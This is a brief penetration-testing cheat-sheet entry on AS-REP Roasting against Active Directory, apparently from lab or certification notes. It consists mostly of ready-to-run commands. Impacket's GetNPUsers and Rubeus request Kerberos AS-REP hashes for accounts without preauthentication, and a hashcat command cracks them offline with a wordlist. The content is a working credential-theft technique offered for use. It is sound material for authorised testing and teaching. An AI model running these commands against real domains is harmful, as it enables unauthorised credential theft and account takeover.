# AS-REP Roasting

Targets accounts with **Do not require Kerberos preauthentication** enabled. An AS-REP can be requested without knowing the password, and the encrypted part can be cracked offline.

```bash
# From Linux (requires valid domain credentials)
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete

# Find only vulnerable users (no hash extraction)
impacket-GetNPUsers -dc-ip 192.168.50.70

# From Windows
.\Rubeus.exe asreproast /nowrap

# Crack
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
